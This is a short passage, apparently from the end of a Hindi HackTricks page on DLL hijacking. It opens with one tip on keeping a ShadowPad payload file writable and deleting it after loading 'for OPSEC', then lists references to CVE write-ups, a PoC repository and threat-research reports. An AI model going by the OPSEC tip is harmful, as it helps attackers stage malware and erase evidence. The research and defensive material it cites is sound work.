* ShadowPad का decryptor उम्मीद करता है कि TMP blob loader के पास रहे और writable हो ताकि mapping के बाद वह फाइल को zero कर सके। payload load होने तक directory writable रखें; एक बार memory में रहने पर TMP फाइल सुरक्षित रूप से delete की जा सकती है OPSEC के लिए।

## संदर्भ

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
